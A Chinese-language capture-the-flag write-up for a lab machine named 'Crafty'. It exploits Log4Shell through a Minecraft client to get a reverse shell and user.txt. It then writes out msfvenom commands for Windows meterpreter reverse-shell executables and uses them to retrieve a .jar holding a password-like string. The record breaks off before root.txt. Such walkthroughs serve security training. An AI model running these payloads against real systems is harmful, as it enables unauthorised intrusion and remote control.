Crafty Level:Easy
===
尋找user.txt
---
    1.執行Nmap蒐集資訊
    
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/fcb9fa95-f96f-4688-88d0-ef140cf168a6)

    2.目錄列舉，發現一個js資料夾是403

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/f5b4d0b6-d52e-48ea-9c03-ed9bf1a63722)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/711cd664-28f2-46c3-b9ab-72df376aa95f)

    3.在使用dirbuster列舉，發現js資料夾裡面有main.js

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/e5673fc1-5556-4cf8-ad8b-2bd90a58b769)

    4.開啟main.js，有一段內容引人注目
    
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/a3c42d5c-3937-4ac7-982e-0e4bf796c188)

這段程式碼主要功能是取得和顯示一個遊戲伺服器上的線上玩家數量。大概指的是mc伺服器，它透過定期查詢一個外部API來實現這一點，裡面運用了**updatePlayercount函數，**先是向https://api.bybilly.uk/api/players/${ip}/ ${port}發送一個GET請求，查詢指定IP和端口的遊戲伺服器的在線玩家數量，如果返回的是online，則顯示在.sip裡面，如果不返回online，說明斷線了，然後會在.playercount中顯示相應的信息，並使用setInterval設置一個定時器，每60秒調用一次updatePlayercount函數以定期更新玩家數量，裡面的是25565端口值得是mc的默認端口，這次利用log4j的poc來反彈shell，這次利用的是CVE-2021-44228編號的poc（也稱為Log4Shell漏洞）

    5.找到Log4Shell POC，執行前先下載jdk並變更檔名為jdk1.8.0_20
[CVE-2021-44228](https://github.com/kozmer/log4j-shell-poc)

[jdk](https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/216407a1-9d28-4028-87dd-07ea685ce016)

    6.修改poc.py，因系統為Windows所以改成cmd.exe
    
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/6fd8f14f-7aa9-4cac-afb0-e598f6603cd4)

    7.執行poc.py，會產生一組LDAP位置

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/066b4a78-ee68-4dd8-9260-763098dc1745)

    8.下載mc工具
[mc工具](https://github.com/ammaraskar/pyCraft)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/b7d546bd-d42f-483b-81d7-24f192eb4cc6)

    9.執行mc工具，出現連接後輸入LDAP位置
    
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/db107bb6-81f3-4335-9ff5-21535330d8af)

    10.log4j會出現200，nc就會成功反彈shell

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/908cdb72-8770-4997-bf80-6b79d9b29319)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/23f5dcf6-c18b-458d-8d54-4c19a9c83522)

    11.找到user.txt

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/8e333a12-f6d2-49c3-ae1c-69e2aaae7af8)

尋找root.txt
---
    12.在plugins底下發現有一個.jar的檔案，需下載檢查內容

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/9510f70e-68d6-4bef-91e8-24460b8e0326)

    13.使用msfvenom建立一個reverse shell
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe
    
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/e5ceb9f4-3f51-4d13-9321-191fc35e0a5a)

    14.使用msf建立reverse連接

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/b4d6cdf8-2705-4eac-a4db-cf64ce8ae515)

    15.將製作好的reverse shell傳輸到Windows上

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/e9bb9934-d1f5-40da-bd8c-68f47607fc59)

    16.執行expl.exe，msf會取得連接

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/d4431f48-4295-47bc-b419-b62d84f61223)

    17.在msf上直接download .jar檔案

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/67d6a99c-5dbf-45e8-a894-a2cf8f93cb22)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/db619987-8f13-4d72-8dc5-b8eb05c5974f)

    18.反編譯.jar檔檢視內容，發現一組很像密碼的字串

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/26564a79-7f1e-4637-8226-a375a26d0780)

    19.找到RunasCs工具
    
[RunasCs](https://github.com/antonioCoco/RunasCs/releases)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/0b15b409-49bf-48cb-8a41-a521f69537ff)


    20.使用msfvenom另外建立一個reverse shell
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4246 -f exe -o exp2.exe

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/4392be79-8ed0-4349-b9ff-73f93da94669)

    21.將exp2.exe和RunasCs.exe上傳，出現timeout的情況
    輸入sessions --interact 2 --timeout 10000
    
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/9b5150da-83db-413f-b130-838e517b3753)


